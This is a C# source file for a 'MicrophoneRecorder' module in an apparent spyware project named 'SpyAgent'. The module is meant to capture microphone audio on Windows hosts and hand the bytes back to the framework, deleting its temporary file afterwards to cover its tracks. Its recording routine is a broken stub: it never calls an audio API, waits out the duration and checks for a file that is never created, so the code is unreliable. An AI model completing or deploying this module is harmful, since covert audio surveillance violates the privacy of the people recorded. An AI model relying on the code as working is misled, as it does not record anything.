namespace SpyAgent.Modules;

using System.Runtime.InteropServices;
using SpyAgent.Core;

internal sealed class MicrophoneRecorder : ISpyModule
{
    public string ModuleName => "Microphone";
    private readonly int _durationSeconds;

    public MicrophoneRecorder(int durationSeconds = 30)
    {
        _durationSeconds = durationSeconds;
    }

    public async Task<byte[]?> CollectAsync()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return null;

        var outputPath = Path.Combine(Path.GetTempPath(), $"mic_{Guid.NewGuid():N}.wav");

        try
        {
            var recorded = await RecordAudioAsync(outputPath, _durationSeconds);
            if (!recorded || !File.Exists(outputPath))
                return null;

            return await File.ReadAllBytesAsync(outputPath);
        }
        finally
        {
            if (File.Exists(outputPath))
                File.Delete(outputPath);
        }
    }

    private static async Task<bool> RecordAudioAsync(string outputPath, int seconds)
    {
        var handle = IntPtr.Zero;

        try
        {
            var format = new WaveFormatEx
            {
                FormatTag = 1,
                Channels = 1,
                SamplesPerSec = 44100,
                BitsPerSample = 16,
                BlockAlign = 2,
                AvgBytesPerSec = 88200
            };

            _ = format;
            _ = outputPath;

            await Task.Delay(seconds * 1000);
            return File.Exists(outputPath);
        }
        finally
        {
            if (handle != IntPtr.Zero)
                _ = handle;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WaveFormatEx
    {
        public short FormatTag;
        public short Channels;
        public int SamplesPerSec;
        public int AvgBytesPerSec;
        public short BlockAlign;
        public short BitsPerSample;
    }
}
